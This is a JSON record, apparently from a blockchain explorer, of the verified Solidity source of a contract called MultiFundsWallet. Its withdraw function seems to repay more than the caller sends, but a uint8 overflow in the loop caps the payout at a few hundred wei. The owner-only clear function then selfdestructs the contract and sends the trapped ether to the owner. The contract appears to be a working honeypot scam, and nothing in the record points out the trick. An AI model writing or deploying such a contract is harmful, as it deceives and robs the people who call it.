{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.24;\r\n\r\ncontract MultiFundsWallet\r\n{\r\n    address owner;\r\n    \r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n    \r\n    function withdraw() payable public \r\n    {\r\n        require(msg.sender == tx.origin);\r\n        if(msg.value > 0.2 ether) {\r\n            uint256 value = 0;\r\n            uint256 eth = msg.value;\r\n            uint256 balance = 0;\r\n            for(var i = 0; i < eth*2; i++) {\r\n                value = i*2;\r\n                if(value >= balance) {\r\n                    balance = value;\r\n                }\r\n                else {\r\n                    break;\r\n                }\r\n            }    \r\n            msg.sender.transfer(balance);\r\n        }\r\n    }\r\n    \r\n    function clear() public \r\n    {\r\n        require(msg.sender == owner);\r\n        selfdestruct(owner);\r\n    }\r\n\r\n    function () public payable {\r\n        \r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"clear\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"MultiFundsWallet","CompilerVersion":"v0.4.24+commit.e67f0147","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://c34e570dcb8c75f1bb36a5f3b95c9dba16d9b64b265fdfaf47992d1282d90f8a"}]}